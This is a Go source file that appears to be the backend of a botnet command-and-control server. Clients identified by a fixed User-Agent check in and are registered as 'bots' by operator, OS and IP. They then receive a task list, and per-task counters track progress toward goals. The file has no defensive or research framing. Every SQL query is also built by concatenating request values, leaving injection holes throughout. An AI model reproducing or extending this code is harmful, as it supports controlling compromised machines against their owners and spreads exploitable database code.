package main

import (
	"database/sql"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func DOCKING(c *gin.Context) {
	ua := c.Request.Header.Get("User-Agent")
	if ua == "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+" {
		username := c.PostForm("username")
		os := c.PostForm("os")
		ip := c.PostForm("ip")
		currentTask := c.PostForm("currentTask")
		if isUserExists(username) {
			new := false
			dbName := username + "_b"
			if isBotExists(dbName, ip) {
				updateBot(dbName, os, ip, currentTask)
			} else {
				new = true
				addBot(dbName, os, ip, currentTask)
			}
			var list, tagList string
			var err error
			var calTasksBool bool
			if isTaskExists(username) {
				list, tagList, err = getActiveTask(username)
				calTasksBool = true
			} else {
				list = ""
				tagList = ""
				err = nil
				calTasksBool = false
			}
			if err != nil {
				fmt.Println(err)
			}
			if calTasksBool {
				calTasks(username + "_t", tagList)
			}
			if new {

			}
			c.String(200, list)
		} else {
			c.String(200, "NULL")
		}
	} else {
		c.String(404, "Page not found.")
	}
}

func getActiveTask(username string) (string, string, error) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		return "", "", err
	}
	defer db.Close()
	tableName := username + "_t"
	query := "SELECT * FROM " + tableName
	rows, _ := db.Query(query)
	var taskType, param, goal, now, tag string
	list := ""
	tagList := ""

	for rows.Next() {
		err := rows.Scan(&taskType, &param, &goal, &now, &tag)
		if err != nil {
			return list, "", err
		}
		goalInt, _ := strconv.Atoi(goal)
		nowInt, _ := strconv.Atoi(now)
		if goalInt > nowInt {
			list += taskType + "|" + param + "*"
			tagList += tag + "|"
			fmt.Println(tag)
		}
	}

	list = strings.TrimRight(list, "*")
	tagList = strings.TrimRight(tagList, "|")
	return list, tagList, nil
}

func getNow(dbName, tag string) int {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	tableName := dbName
	query := "SELECT now FROM " + tableName + " WHERE tag=\"" + tag + "\""
	rows := db.QueryRow(query)
	var now string
	err = rows.Scan(&now)
	if err != nil {
		fmt.Println(err)
	}
	nowInt, _ := strconv.Atoi(now)
	fmt.Println(nowInt)
	return nowInt
}

func calTasks(dbName, tagList string) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	fmt.Println(tagList)
	if strings.Contains(tagList, "|") {
		tags := strings.Split(tagList, "|")
		for _, tag := range tags {
			target := getNow(dbName, tag) + 1
			query := fmt.Sprintf("UPDATE %s SET now=\"%d\" WHERE tag=\"%s\"", dbName, target, tag)
			fmt.Println(query)
			_, err = db.Exec(query)
		}
	} else {
		target := getNow(dbName, tagList) + 1
		query := fmt.Sprintf("UPDATE %s SET now=\"%d\" WHERE tag=\"%s\"", dbName, target, tagList)
		fmt.Println(query)
		_, err = db.Exec(query)
	}
	if err != nil {
		fmt.Println(err)
	}
}

func isBotExists(dbName, IP string) bool {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("SELECT EXISTS(SELECT * from %s WHERE ip=\"%s\")", dbName, IP)
	rows := db.QueryRow(query)
	var exist string
	err = rows.Scan(&exist)
	if err != nil {
		fmt.Println(err)
	}
	if exist == "1" {
		return true
	} else {
		return false
	}
}

func updateBot(dbName, os, ip, currentTask string) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	loc, _ := time.LoadLocation("UTC")
	t := time.Now().In(loc)
	now := t.Format("2006-01-02 15:04:05")
	query := fmt.Sprintf("UPDATE %s SET os=\"%s\", current_t=\"%s\", last_resp=\"%s\" WHERE ip=\"%s\"", dbName, os, currentTask, now, ip)
	_, err = db.Exec(query)
		if err != nil {
		fmt.Println(err)
	}
}

func addBot(dbName, os, ip, currentTask string) {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	loc, _ := time.LoadLocation("UTC")
	t := time.Now().In(loc)
	now := t.Format("2006-01-02 15:04:05")
	query := fmt.Sprintf("INSERT INTO %s VALUES (\"%s\", \"%s\", \"%s\", \"%s\")", dbName, os, ip, currentTask, now)
	_, err = db.Exec(query)
		if err != nil {
		fmt.Println(err)
	}
}

func respInterval(c *gin.Context) {
	username := c.Param("username")
	c.String(http.StatusOK, getInterval(username))
}

func respStatus(c *gin.Context) {
	username := c.Param("username")
	c.String(http.StatusOK, getUserInfo(username))
}

func isTaskExists(username string) bool {
	db, err := sql.Open("mysql", dbQuery)
	if err != nil {
		fmt.Println(err)
	}
	defer db.Close()
	query := fmt.Sprintf("SELECT EXISTS(SELECT * from %s_t)", username)
	rows := db.QueryRow(query)
	var exist string
	err = rows.Scan(&exist)
	if err != nil {
		fmt.Println(err)
	}
	if exist == "1" {
		return true
	} else {
		return false
	}
}

